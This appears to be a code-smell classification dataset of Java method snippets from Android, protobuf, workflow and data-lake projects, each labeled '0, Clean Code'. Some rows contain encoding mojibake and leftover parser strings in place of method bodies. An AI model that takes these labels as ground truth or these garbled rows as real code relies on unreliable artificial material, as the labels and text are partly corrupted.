  List<String> mCardStyleTiles=getTileList();
  if (mPrefsMap.getBoolean(""systemui_plugin_card_tiles_enabled"") && !mPrefsMap.getString(""systemui_plugin_card_tiles"","""").isEmpty()) {
    CustomCardTiles.initCustomCardTiles(classLoader,mCardStyleTiles);
  }
}",0,Clean Code
"/** 
 * 鑾峰彇鏉′欢鑺傜偣鐨勬墍鏈夋潯浠跺垎鏀�
 * @param flowId
 * @param version
 * @return
 */
List<FlowCondition> getByFlowId(Long flowId,Integer version);
",0,Clean Code
"public String getEmojiPackageId(){
  return this.emojiPackageId;
}
",0,Clean Code
"public String getEmbeddingColumnName(){
  return this.embeddingColumnName;
}
",0,Clean Code
"@Override protected void clearStore(){
  log.debug(""Deleting the search index"");
  AzureAiSearchContentRetriever azureAiSearchContentRetriever=contentRetrieverWithVector;
  try {
    azureAiSearchContentRetriever.deleteIndex();
    azureAiSearchContentRetriever.createOrUpdateIndex(dimensions);
  }
 catch (  RuntimeException e) {
    log.error(""Failed to clean up the index. You should look at deleting it manually."",e);
  }
}
",0,Clean Code
"public RedisPollDataDAO(JedisProxy jedisProxy,ObjectMapper objectMapper,ConductorProperties conductorProperties,RedisProperties properties){
  super(jedisProxy,objectMapper,conductorProperties,properties);
}
",0,Clean Code
"private FMRegressionModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private FMRegressionModelProto(){
  dimensionNames_=com.google.protobuf.LazyStringArrayList.EMPTY;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1a409f35",0,Clean Code
"public JedisProxy(@Qualifier(DEFAULT_CLIENT_INJECTION_NAME) JedisCommands jedisCommands){
  this.jedisCommands=jedisCommands;
}
",0,Clean Code
"/** 
 * <code>optional uint32 round_count = 2;</code>
 * @return the roundCount
 */
public int getRoundCount(){
  return roundCount;
}",0,Clean Code
"/** 
 * <code>repeated .RogueRoom room_list = 3;</code>
 * @return whether the roomList field is set
 */
public boolean hasRoomList(){
  return (bitField0_ & 0x00000010) != 0;
}",0,Clean Code
"List<Message> getMessages(String queue);
",0,Clean Code
"@Override public boolean hasElement(SecurityManager securityManager,URI uri) throws IOException, SecurityManagerException {
  return delegate.hasElement(securityManager,uri);
}
@Override public boolean hasElement(SecurityManager securityManager,URI uri) throws SecurityManagerException {
  securityManager.checkResolveModule(uri);
  return FileResolver.hasElement(uri);
}
@Override public boolean hasElement(SecurityManager securityManager,URI uri) throws SecurityManagerException {
  securityManager.checkResolveModule(uri);
  return resolver.hasElement(uri);
}
@Override public boolean hasElement(SecurityManager manager,URI uri) throws SecurityManagerException {
  manager.checkResolveModule(uri);
  var uriPath=uri.getPath();
  assert uriPath.charAt(0) == '/';
  return classLoader.getResource(uriPath.substring(1)) != null;
}
@Override public boolean hasElement(SecurityManager securityManager,URI elementUri) throws IOException, SecurityManagerException {
  securityManager.checkResolveModule(elementUri);
  var assetUri=PackageAssetUri.create(elementUri);
  return getPackageResolver().hasElement(assetUri,assetUri.getPackageUri().getChecksums());
}
@Override public boolean hasElement(SecurityManager securityManager,URI elementUri) throws IOException, SecurityManagerException {
  securityManager.checkResolveModule(elementUri);
  var packageAssetUri=PackageAssetUri.create(elementUri);
  var dependency=getProjectDepsResolver().getResolvedDependency(packageAssetUri.getPackageUri());
  var path=getLocalPath(dependency,packageAssetUri);
  if (path != null) {
    securityManager.checkResolveModule(path.toUri());
    return FileResolver.hasElement(path);
  }
  var dep=(Dependency.RemoteDependency)dependency;
  assert dep.getChecksums() != null;
  return getPackageResolver().hasElement(packageAssetUri,dep.getChecksums());
}",0,Clean Code
"/** 
 * Compatible with old formats
 */
private String buildRowKeyExpress(Object rowKeyInfo){
  if (rowKeyInfo == null) {
    return null;
  }
  if (rowKeyInfo instanceof String) {
    return rowKeyInfo.toString();
  }
  if (!(rowKeyInfo instanceof List)) {
    return null;
  }
  StringBuilder expressBuilder=new StringBuilder();
  for (  Map item : ((List<Map>)rowKeyInfo)) {
    Object indexObj=item.get(COLUMN_INDEX_KEY);
    if (indexObj != null) {
      int index=Integer.parseInt(String.valueOf(indexObj));
      if (index >= 0) {
        expressBuilder.append(String.format(""$(%s)"",columnNames.get(index)));
        continue;
      }
    }
    String value=(String)item.get(COLUMN_VALUE_KEY);
    if (StringUtils.isNotEmpty(value)) {
      expressBuilder.append(value);
    }
  }
  return expressBuilder.toString();
}",0,Clean Code
"public SynchronizedMapSerializer(Fury fury,Class cls,Function factory,long offset){
  super(fury,cls,false);
  this.factory=factory;
  this.offset=offset;
}
",0,Clean Code
"@Override public void searched(final List<Integer> rowIndices,final boolean selectResultsOnly){
  final Set<Pair<RawFunction,RawFunction>> functionPairs=new HashSet<>();
  final MatchedFunctionsViewsTableModel tableModel=(MatchedFunctionsViewsTableModel)matchedFunctionsViewTable.getTableModel();
  final CTableSorter sorterModel=matchedFunctionsViewTable.getModel();
  final ListSelectionModel selectionModel=matchedFunctionsViewTable.getSelectionModel();
  for (  final Integer index : rowIndices) {
    final int modelIndex=sorterModel.modelIndex(index);
    if (selectResultsOnly) {
      selectionModel.addSelectionInterval(index,index);
    }
 else {
      functionPairs.add(tableModel.getMatchedFunctionPairAt(modelIndex));
    }
  }
  if (!selectResultsOnly) {
    tableModel.setMatchedFunctionPairs(functionPairs);
    tableModel.fireTableDataChanged();
  }
  if (rowIndices.size() > 0) {
    clearButton.setIcon(ICON_CLEAR);
  }
 else {
    clearButton.setIcon(ICON_CLEAR_GRAY);
  }
  updateUI();
}",0,Clean Code
"public static void addF8(FlatBufferBuilder builder,double f8){
  builder.addDouble(8,f8,0.0);
}",0,Clean Code
"ContainerInstance parse(DeploymentNodeDslContext context,Tokens tokens){
  if (tokens.hasMoreThan(TAGS_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR);
  }
  if (!tokens.includes(IDENTIFIER_INDEX)) {
    throw new RuntimeException(""Expected: "" + GRAMMAR);
  }
  String containerIdentifier=tokens.get(IDENTIFIER_INDEX);
  Element element=context.getElement(containerIdentifier,Container.class);
  if (element == null) {
    throw new RuntimeException(""The container \"""" + containerIdentifier + ""\"" does not exist"");
  }
  DeploymentNode deploymentNode=context.getDeploymentNode();
  Set<String> deploymentGroups=new HashSet<>();
  if (tokens.includes(DEPLOYMENT_GROUPS_TOKEN)) {
    String token=tokens.get(DEPLOYMENT_GROUPS_TOKEN);
    String[] deploymentGroupReferences=token.split("","");
    for (    String deploymentGroupReference : deploymentGroupReferences) {
      Element e=context.getElement(deploymentGroupReference);
      if (e instanceof DeploymentGroup) {
        deploymentGroups.add(e.getName());
      }
    }
  }
  ContainerInstance containerInstance=deploymentNode.add((Container)element,deploymentGroups.toArray(new String[]{}));
  if (tokens.includes(TAGS_INDEX)) {
    String tags=tokens.get(TAGS_INDEX);
    containerInstance.addTags(tags.split("",""));
  }
  if (context.hasGroup()) {
    containerInstance.setGroup(context.getGroup().getName());
    context.getGroup().addElement(containerInstance);
  }
  return containerInstance;
}
",0,Clean Code
"private void exportProcedure(Connection connection,String schemaName,String procedureName,StringBuilder sqlBuilder) throws SQLException {
  String sql=String.format(PROCEDURE_DDL_SQL,schemaName,procedureName);
  try (ResultSet resultSet=connection.createStatement().executeQuery(sql)){
    if (resultSet.next()) {
      sqlBuilder.append(resultSet.getString(""ddl"")).append(""\n"");
    }
  }
 }
",0,Clean Code
"public GroupDetailInfo(){
  this.ownerUid="""";
  this.groupName="""";
  this.fingerMemo="""";
  this.groupQuestion="""";
  this.richFingerMemo="""";
  this.tagRecord=new ArrayList<>();
  this.groupMemo="""";
  this.cmdUinMsgMask=GroupMsgMask.values()[0];
  this.cmdUinPrivilege=MemberRole.values()[0];
  this.remarkName="""";
}
public GroupDetailInfo(long j2,String str,int i2,int i3,int i4,int i5,int i6,int i7,String str2,String str3,String str4,int i8,String str5,ArrayList<GroupTagRecord> arrayList,int i9,int i10,int i11,int i12,int i13,int i14,int i15,int i16,int i17,int i18,String str6,int i19,int i20,int i21,GroupMsgMask groupMsgMask,int i22,MemberRole memberRole,int i23,int i24,String str7,boolean z){
  this.ownerUid="""";
  this.groupName="""";
  this.fingerMemo="""";
  this.groupQuestion="""";
  this.richFingerMemo="""";
  this.tagRecord=new ArrayList<>();
  this.groupMemo="""";
  this.cmdUinMsgMask=GroupMsgMask.values()[0];
  this.cmdUinPrivilege=MemberRole.values()[0];
  this.remarkName="""";
  this.groupCode=j2;
  this.ownerUid=str;
  this.groupFlag=i2;
  this.groupFlagExt=i3;
  this.maxMemberNum=i4;
  this.memberNum=i5;
  this.groupOption=i6;
  this.classExt=i7;
  this.groupName=str2;
  this.fingerMemo=str3;
  this.groupQuestion=str4;
  this.certType=i8;
  this.richFingerMemo=str5;
  this.tagRecord=arrayList;
  this.shutUpAllTimestamp=i9;
  this.shutUpMeTimestamp=i10;
  this.groupTypeFlag=i11;
  this.privilegeFlag=i12;
  this.groupSecLevel=i13;
  this.groupFlagExt3=i14;
  this.isConfGroup=i15;
  this.isModifyConfGroupFace=i16;
  this.isModifyConfGroupName=i17;
  this.groupFlagExt4=i18;
  this.groupMemo=str6;
  this.cmdUinMsgSeq=i19;
  this.cmdUinJoinTime=i20;
  this.cmdUinUinFlag=i21;
  this.cmdUinMsgMask=groupMsgMask;
  this.groupSecLevelInfo=i22;
  this.cmdUinPrivilege=memberRole;
  this.cmdUinFlagEx2=i23;
  this.appealDeadline=i24;
  this.remarkName=str7;
  this.isTop=z;
}",0,Clean Code
"Object deepCopyValue(Object value){
  if (value == null) {
    return null;
  }
  if (value instanceof Bundle) {
    return ((Bundle)value).deepCopy();
  }
 else   if (value instanceof PersistableBundle) {
    return ((PersistableBundle)value).deepCopy();
  }
 else   if (value instanceof ArrayList) {
    return deepcopyArrayList((ArrayList)value);
  }
 else   if (value.getClass().isArray()) {
    if (value instanceof int[]) {
      return ((int[])value).clone();
    }
 else     if (value instanceof long[]) {
      return ((long[])value).clone();
    }
 else     if (value instanceof float[]) {
      return ((float[])value).clone();
    }
 else     if (value instanceof double[]) {
      return ((double[])value).clone();
    }
 else     if (value instanceof Object[]) {
      return ((Object[])value).clone();
    }
 else     if (value instanceof byte[]) {
      return ((byte[])value).clone();
    }
 else     if (value instanceof short[]) {
      return ((short[])value).clone();
    }
 else     if (value instanceof char[]) {
      return ((char[])value).clone();
    }
  }
  return value;
}
",0,Clean Code
"public void allowScreenshots(boolean allowScreenshots){
  if (BuildVars.DEBUG_PRIVATE_VERSION) {
    return;
  }
  allowScreenshots=!isShowing || allowScreenshots;
  if (this.allowScreenshots != allowScreenshots) {
    this.allowScreenshots=allowScreenshots;
    if (surfaceView != null) {
      surfaceView.setSecure(!allowScreenshots);
    }
    if (ATTACH_TO_FRAGMENT) {
      if (fragment.getParentActivity() != null) {
        if (allowScreenshots) {
          fragment.getParentActivity().getWindow().clearFlags(WindowManager.LayoutParams.FLAG_SECURE);
        }
 else {
          fragment.getParentActivity().getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);
        }
      }
    }
 else {
      if (allowScreenshots) {
        windowLayoutParams.flags&=~WindowManager.LayoutParams.FLAG_SECURE;
      }
 else {
        windowLayoutParams.flags|=WindowManager.LayoutParams.FLAG_SECURE;
      }
      try {
        windowManager.updateViewLayout(windowView,windowLayoutParams);
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
  }
}
",0,Clean Code
"private void openEditingMessageInPhotoEditor(){
  if (editingMessageObject == null || !editingMessageObject.canEditMedia() || editingMessageObjectReqId != 0) {
    return;
  }
  if (!editingMessageObject.isPhoto() && !editingMessageObject.isVideo()) {
    return;
  }
  final MessageObject object=editingMessageObject;
  File file=null;
  if (!TextUtils.isEmpty(object.messageOwner.attachPath)) {
    file=new File(object.messageOwner.attachPath);
    if (!file.exists()) {
      file=null;
    }
  }
  if (file == null) {
    file=FileLoader.getInstance(currentAccount).getPathToMessage(object.messageOwner);
  }
  if (!file.exists()) {
    return;
  }
  PhotoViewer.getInstance().setParentActivity(this,themeDelegate);
  final ArrayList<Object> photos=new ArrayList<>();
  final MediaController.PhotoEntry entry=new MediaController.PhotoEntry(0,0,0,file.getAbsolutePath(),0,object.isVideo(),0,0,0);
  entry.caption=chatActivityEnterView.getFieldText();
  photos.add(entry);
  PhotoViewer.getInstance().openPhotoForSelect(photos,0,2,false,new PhotoViewer.EmptyPhotoViewerProvider(){
    @Override public PhotoViewer.PlaceProviderObject getPlaceForPhoto(    MessageObject messageObject,    TLRPC.FileLocation fileLocation,    int index,    boolean needPreview){
      return ChatActivity.this.getPlaceForPhoto(object,null,needPreview,true);
    }
    @Override public void sendButtonPressed(    int index,    VideoEditedInfo videoEditedInfo,    boolean notify,    int scheduleDate,    boolean forceDocument){
      if (editingMessageObject != object) {
        return;
      }
      if (entry.isCropped || entry.isPainted || entry.isFiltered|| videoEditedInfo != null) {
        sendMedia(entry,videoEditedInfo,notify,scheduleDate,forceDocument);
      }
 else {
        chatActivityEnterView.doneEditingMessage();
      }
    }
    @Override public boolean canCaptureMorePhotos(){
      return false;
    }
    @Override public boolean allowSendingSubmenu(){
      return false;
    }
    @Override public MessageObject getEditingMessageObject(){
      return editingMessageObject == object ? object : null;
    }
    @Override public void onCaptionChanged(    CharSequence caption){
      if (editingMessageObject == object) {
        chatActivityEnterView.setFieldText(caption,true);
      }
    }
    @Override public boolean closeKeyboard(){
      if (chatActivityEnterView != null && isKeyboardVisible()) {
        chatActivityEnterView.closeKeyboard();
        return true;
      }
      return false;
    }
  }
,this);
}",0,Clean Code
"@Override public ServletInputStream getInputStream() throws IOException {
  final ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(body);
  return new ServletInputStream(){
    @Override public int read(){
      return byteArrayInputStream.read();
    }
    @Override public boolean isFinished(){
      return byteArrayInputStream.available() == 0;
    }
    @Override public boolean isReady(){
      return true;
    }
    @Override public void setReadListener(    ReadListener readListener){
    }
  }
;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)50);
    output.writeMessageNoTag(buffInfo);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)82);
    output.writeMessageNoTag(miracleInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)90);
    output.writeMessageNoTag(itemInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeMessage(FieldNames.buffInfo,buffInfo);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.miracleInfo,miracleInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeMessage(FieldNames.itemInfo,itemInfo);
  }
  output.endObject();
}",0,Clean Code
"@ApiOperation(""淇敼鏂囦欢鍚嶇О"") @PostMapping(""/renameFile"") public Result renameFile(@RequestBody RenameFileBO requestBO){
  adminFileService.renameFile(requestBO);
  return Result.ok();
}
",0,Clean Code
"public int getGroupTypeFlag(){
  return this.groupTypeFlag;
}
",0,Clean Code
"@Override public SceneEntityRefreshInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  addEntity.clearQuick();
  return this;
}",0,Clean Code
"@Test @Order(2) void executeWriteShouldExecuteQuery(){
  String query=""CREATE (n:Person {name: 'John'})"";
  ResultSummary resultSummary=neo4jGraph.executeWrite(query);
  assertEquals(1,resultSummary.counters().nodesCreated());
}",0,Clean Code
"public void cleanResources(boolean recycle){
  if (reusableFramebuffer != 0) {
    buffers[0]=reusableFramebuffer;
    GLES20.glDeleteFramebuffers(1,buffers,0);
    reusableFramebuffer=0;
  }
  if (bitmapTexture != null) {
    bitmapTexture.cleanResources(recycle);
  }
  if (bitmapBlurTexture != null) {
    bitmapBlurTexture.cleanResources(recycle);
  }
  if (paintTexture != 0) {
    buffers[0]=paintTexture;
    GLES20.glDeleteTextures(1,buffers,0);
    paintTexture=0;
  }
  for (  Texture texture : brushTextures.values()) {
    if (texture != null) {
      texture.cleanResources(true);
    }
  }
  brushTextures.clear();
  if (helperTexture != 0) {
    buffers[0]=helperTexture;
    GLES20.glDeleteTextures(1,buffers,0);
    helperTexture=0;
  }
  if (bluredTexture != null) {
    bluredTexture.cleanResources(true);
  }
  if (originalBitmapTexture != null) {
    originalBitmapTexture.cleanResources(true);
  }
  if (shaders != null) {
    for (    Shader shader : shaders.values()) {
      shader.cleanResources();
    }
    shaders=null;
  }
}",0,Clean Code
"protected BedrockUsage(AmazonBedrockInvocationMetrics usage){
  Assert.notNull(usage,""OpenAI Usage must not be null"");
  this.usage=usage;
}
",0,Clean Code
"public Builder(AMQPEventQueueProperties properties){
  this.properties=properties;
  this.addresses=buildAddressesFromHosts();
  this.factory=buildConnectionFactory();
  this.batchSize=properties.getBatchSize();
  this.pollTimeInMS=(int)properties.getPollTimeDuration().toMillis();
}
",0,Clean Code
"/** 
 * Creates a new instance of  {@link SegmentBuilder}.
 * @param maxSegmentSize The maximum size of a segment.
 * @param sizeFunction The function to use to estimate the size of a text.
 * @param joinSeparator The separator to use when joining multiple texts into a single segment.
 */
public SegmentBuilder(int maxSegmentSize,Function<String,Integer> sizeFunction,String joinSeparator){
  this.maxSegmentSize=ensureGreaterThanZero(maxSegmentSize,""maxSegmentSize"");
  this.sizeFunction=ensureNotNull(sizeFunction,""sizeFunction"");
  this.joinSeparator=ensureNotNull(joinSeparator,""joinSeparator"");
  joinSeparatorSize=sizeOf(joinSeparator);
}
",0,Clean Code
"/** 
 * Attempts to load from a local file using the relative ""filePrefix"", ie starting at the current directory. For example
 * @param filePrefix could be ""webSiteClasses\\site1\\"".
 */
public FileClassLoader(final String filePrefix){
  this.filePrefix=filePrefix;
}",0,Clean Code
"@Override public void checkReadResource(URI uri) throws SecurityManagerException {
  checkRead(uri,allowedResources,""resourceNotInAllowList"");
}
",0,Clean Code
"@Override public void onScrollStateChanged(RecyclerView recyclerView,int newState){
  if (newState == RecyclerView.SCROLL_STATE_DRAGGING) {
    wasManualScroll=true;
    scrollingManually=true;
  }
 else {
    scrollingManually=false;
  }
  if (newState == RecyclerView.SCROLL_STATE_IDLE) {
    wasManualScroll=false;
    disableActionBarScrolling=false;
    if (waitingForScrollFinished) {
      waitingForScrollFinished=false;
      if (updatePullAfterScroll) {
        viewPage.listView.updatePullState();
        updatePullAfterScroll=false;
      }
      viewPage.dialogsAdapter.notifyDataSetChanged();
    }
    if (filterTabsView != null && filterTabsView.getVisibility() == View.VISIBLE && viewPages[0].listView == recyclerView) {
      int scrollY=(int)-actionBar.getTranslationY();
      int actionBarHeight=ActionBar.getCurrentActionBarHeight();
      if (scrollY != 0 && scrollY != actionBarHeight) {
        if (scrollY < actionBarHeight / 2) {
          if (viewPages[0].listView.canScrollVertically(-1)) {
            recyclerView.smoothScrollBy(0,-scrollY);
          }
        }
 else         if (viewPages[0].listView.canScrollVertically(1)) {
          recyclerView.smoothScrollBy(0,actionBarHeight - scrollY);
        }
      }
    }
  }
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RegionEntry)) {
    return false;
  }
  RegionEntry other=(RegionEntry)o;
  return bitField0_ == other.bitField0_ && (!hasName() || name.equals(other.name)) && (!hasTitle() || title.equals(other.title)) && (!hasDispatchUrl() || dispatchUrl.equals(other.dispatchUrl)) && (!hasEnvType() || envType.equals(other.envType)) && (!hasDisplayName() || displayName.equals(other.displayName)) && (!hasMsg() || msg.equals(other.msg));
}",0,Clean Code
"public static DispatchRegionData parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new DispatchRegionData(),data).checkInitialized();
}
public static DispatchRegionData parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new DispatchRegionData(),input).checkInitialized();
}
public static DispatchRegionData parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new DispatchRegionData(),input).checkInitialized();
}
",0,Clean Code
"@Override public boolean matches(final ZyGraphNode<? extends CViewNode<?>> node){
  if (panel.getRecursionState() == RecursionState.IS_RECURSION) {
    return node.getChildren().contains(node);
  }
 else {
    return node.getChildren().contains(node);
  }
}
",0,Clean Code
"@Override public RogueMiracle mergeFrom(final RogueMiracle other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasNKBEHFHLPEF()) {
    setNKBEHFHLPEF(other.nKBEHFHLPEF);
  }
  if (other.hasMMFONFFPNJM()) {
    setMMFONFFPNJM(other.mMFONFFPNJM);
  }
  if (other.hasMiracleId()) {
    setMiracleId(other.miracleId);
  }
  if (other.hasKONAGCDHKKH()) {
    getMutableKONAGCDHKKH().addAll(other.kONAGCDHKKH);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1fa4cf8a!org.eclipse.jdt.core.dom.MethodDeclaration@4f8c3319@Override public KONAGCDHKKHEntry mergeFrom(final KONAGCDHKKHEntry other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasKey()) {
    setKey(other.key);
  }
  if (other.hasValue()) {
    setValue(other.value_);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@82cacb2!org.eclipse.jdt.core.dom.MethodDeclaration@648859f3",0,Clean Code
"@Override public void draw(Canvas canvas,CharSequence text,int start,int end,float x,int top,int y,int bottom,Paint paint){
  TextPaint textPaint=(TextPaint)paint;
  float characterWidth=paint.measureText(this.text) / 3;
  float baseline=fixTop ? -textPaint.getFontMetrics().ascent : -textPaint.getFontMetrics().top;
  float textThickness=(float)((textPaint.getFontMetrics().bottom - textPaint.getFontMetrics().top) * (isMediumTypeface ? 0.05f : 0.0365f));
  baseline-=textThickness;
  if (waitForNextAnimation) {
    if (System.currentTimeMillis() - lastTime > 1000) {
      waitForNextAnimation=false;
    }
  }
 else {
    swapProgress+=16 / 300f;
    if (swapProgress > 1) {
      swapProgress=0;
      swapPosition1--;
      swapPosition2--;
      if (swapPosition1 < 0) {
        swapPosition1=1;
        swapPosition2=2;
        waitForNextAnimation=true;
        lastTime=System.currentTimeMillis();
      }
    }
  }
  for (int i=0; i < 3; i++) {
    float cx=characterWidth * i + x + characterWidth / 2f;
    float cy=baseline;
    if (i == swapPosition1) {
      float fromX=cx;
      float toX=characterWidth * (i + 1) + x + characterWidth / 2f;
      cx=AndroidUtilities.lerp(fromX,toX,swapProgress);
      float swapProgressHalf=swapProgress < 0.5f ? swapProgress / 0.5f : 1f - (swapProgress - 0.5f) / 0.5f;
      cy=AndroidUtilities.lerp(cy,cy - characterWidth / 2f,circle.getInterpolation(swapProgressHalf));
    }
 else     if (i == swapPosition2) {
      float fromX=cx;
      float toX=characterWidth * (i - 1) + x + characterWidth / 2f;
      cx=AndroidUtilities.lerp(fromX,toX,swapProgress);
    }
    canvas.drawCircle(cx,cy,textThickness,paint);
  }
  if (parent != null) {
    parent.invalidate();
  }
}",0,Clean Code
"@Override public Long exportChangeSalaryRecord(MultipartFile multipartFile){
  UploadExcelBO uploadExcelBO=new UploadExcelBO();
  AdminMessage adminMessage=new AdminMessage();
  adminMessage.setCreateUser(UserUtil.getUserId());
  adminMessage.setCreateTime(LocalDateTime.now());
  adminMessage.setRecipientUser(UserUtil.getUserId());
  adminMessage.setLabel(8);
  adminMessage.setType(AdminMessageEnum.HRM_CHANGE_SALARY_IMPORT.getType());
  Long messageId=adminMessageService.saveOrUpdateMessage(adminMessage);
  uploadExcelBO.setMessageId(messageId);
  uploadExcelBO.setUserInfo(UserUtil.getUser());
  redis.setex(AdminCacheKey.UPLOAD_EXCEL_MESSAGE_PREFIX + messageId.toString(),UPLOAD_EXCEL_EXIST_TIME,0);
  ExcelImport uploadService=new ChangeSalaryExport(uploadExcelBO,multipartFile);
  hrmThreadPoolExecutor.execute(uploadService);
  return messageId;
}",0,Clean Code
"IModuleConfiguration getConfiguration();
",0,Clean Code
"@Override public GetFarmStageGachaInfoScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  farmStageGachaInfoList.clear();
  return this;
}",0,Clean Code
"public String getSimilarity(){
  return similarity;
}
",0,Clean Code
"public static ToolChoice from(String functionName){
  return new ToolChoice(functionName);
}
",0,Clean Code
void setY2(double y2);,0,Clean Code
"@Override public int insertDictData(SysDictDataEntity dictData){
  int row=dictDataMapper.insert(dictData);
  if (row > 0) {
    List<SysDictDataEntity> dictDatas=dictDataMapper.selectDictDataByType(dictData.getDictType());
    DictUtils.setDictCache(dictData.getDictType(),dictDatas);
  }
  return row;
}",0,Clean Code
"/** 
 * @return factory for creating GachaCeilingAvatar messages
 */
public static MessageFactory<GachaCeilingAvatar> getFactory(){
  return GachaCeilingAvatarFactory.INSTANCE;
}
",0,Clean Code
"@Override public void flush(String queueName){
  DynoQueue queue=queues.get(queueName);
  if (queue != null) {
    queue.clear();
  }
}
",0,Clean Code
"public String toString(){
  return ""GProRecommendV2Color{uint32R="" + this.uint32R + "",uint32G=""+ this.uint32G+ "",uint32B=""+ this.uint32B+ "",}"";
}",0,Clean Code
"/** 
 * Sets up the hoodie key options (e.g. record key and partition key) from the table definition.
 */
private static void setupHoodieKeyOptions(Configuration conf,CatalogTable table){
  List<String> pkColumns=table.getSchema().getPrimaryKey().map(UniqueConstraint::getColumns).orElse(Collections.emptyList());
  if (pkColumns.size() > 0) {
    String recordKey=String.join("","",pkColumns);
    conf.setString(FlinkOptions.RECORD_KEY_FIELD,recordKey);
  }
  List<String> partitionKeys=table.getPartitionKeys();
  if (partitionKeys.size() > 0) {
    conf.setString(FlinkOptions.PARTITION_PATH_FIELD,String.join("","",partitionKeys));
  }
  if (conf.getString(FlinkOptions.INDEX_TYPE).equals(HoodieIndex.IndexType.BUCKET.name())) {
    if (conf.getString(FlinkOptions.INDEX_KEY_FIELD).isEmpty()) {
      conf.setString(FlinkOptions.INDEX_KEY_FIELD,conf.getString(FlinkOptions.RECORD_KEY_FIELD));
    }
 else {
      Set<String> recordKeySet=Arrays.stream(conf.getString(FlinkOptions.RECORD_KEY_FIELD).split("","")).collect(Collectors.toSet());
      Set<String> indexKeySet=Arrays.stream(conf.getString(FlinkOptions.INDEX_KEY_FIELD).split("","")).collect(Collectors.toSet());
      if (!recordKeySet.containsAll(indexKeySet)) {
        throw new HoodieValidationException(FlinkOptions.INDEX_KEY_FIELD + "" should be a subset of or equal to the recordKey fields"");
      }
    }
  }
  final String[] partitions=conf.getString(FlinkOptions.PARTITION_PATH_FIELD).split("","");
  final String[] pks=conf.getString(FlinkOptions.RECORD_KEY_FIELD).split("","");
  if (partitions.length == 1) {
    final String partitionField=partitions[0];
    if (partitionField.isEmpty()) {
      conf.setString(FlinkOptions.KEYGEN_CLASS_NAME,NonpartitionedAvroKeyGenerator.class.getName());
      LOG.info(""Table option [{}] is reset to {} because this is a non-partitioned table"",FlinkOptions.KEYGEN_CLASS_NAME.key(),NonpartitionedAvroKeyGenerator.class.getName());
      return;
    }
    DataType partitionFieldType=table.getSchema().getFieldDataType(partitionField).orElseThrow(() -> new HoodieValidationException(""Field "" + partitionField + "" does not exist""));
    if (pks.length <= 1 && DataTypeUtils.isDatetimeType(partitionFieldType)) {
      setupTimestampKeygenOptions(conf,partitionFieldType);
      return;
    }
  }
  boolean complexHoodieKey=pks.length > 1 || partitions.length > 1;
  if (complexHoodieKey && FlinkOptions.isDefaultValueDefined(conf,FlinkOptions.KEYGEN_CLASS_NAME)) {
    conf.setString(FlinkOptions.KEYGEN_CLASS_NAME,ComplexAvroKeyGenerator.class.getName());
    LOG.info(""Table option [{}] is reset to {} because record key or partition path has two or more fields"",FlinkOptions.KEYGEN_CLASS_NAME.key(),ComplexAvroKeyGenerator.class.getName());
  }
}",0,Clean Code
"/** 
 * @return the backoff rate of this task definition
 */
public Integer getBackoffScaleFactor(){
  return backoffScaleFactor;
}
",0,Clean Code
"/** 
 * <code>optional uint32 AFMPDBBHCHM = 2;</code>
 * @return this
 */
public DoGachaInRollShopScRsp clearAFMPDBBHCHM(){
  bitField0_&=~0x00000001;
  aFMPDBBHCHM=0;
  return this;
}",0,Clean Code
"public static int serverStringToFeatureType(String s){
switch (s) {
case ""double_limits"":
    return PREMIUM_FEATURE_LIMITS;
case ""more_upload"":
  return PREMIUM_FEATURE_UPLOAD_LIMIT;
case ""faster_download"":
return PREMIUM_FEATURE_DOWNLOAD_SPEED;
case ""voice_to_text"":
return PREMIUM_FEATURE_VOICE_TO_TEXT;
case ""no_ads"":
return PREMIUM_FEATURE_ADS;
case ""infinite_reactions"":
return PREMIUM_FEATURE_REACTIONS;
case ""premium_stickers"":
return PREMIUM_FEATURE_STICKERS;
case ""advanced_chat_management"":
return PREMIUM_FEATURE_ADVANCED_CHAT_MANAGEMENT;
case ""profile_badge"":
return PREMIUM_FEATURE_PROFILE_BADGE;
case ""animated_userpics"":
return PREMIUM_FEATURE_ANIMATED_AVATARS;
case ""app_icons"":
return PREMIUM_FEATURE_APPLICATION_ICONS;
case ""animated_emoji"":
return PREMIUM_FEATURE_ANIMATED_EMOJI;
case ""emoji_status"":
return PREMIUM_FEATURE_EMOJI_STATUS;
case ""translations"":
return PREMIUM_FEATURE_TRANSLATIONS;
}
return -1;
}",0,Clean Code
"public static Drawable getOrCreate(Drawable backgroundDrawable,TLRPC.WallPaper wallpaper,boolean themeIsDark){
  if (backgroundDrawable instanceof ChatBackgroundDrawable) {
    ChatBackgroundDrawable chatBackgroundDrawable=(ChatBackgroundDrawable)backgroundDrawable;
    if (wallpaper.uploadingImage != null) {
      if (wallpaper.uploadingImage.equals(chatBackgroundDrawable.wallpaper.uploadingImage)) {
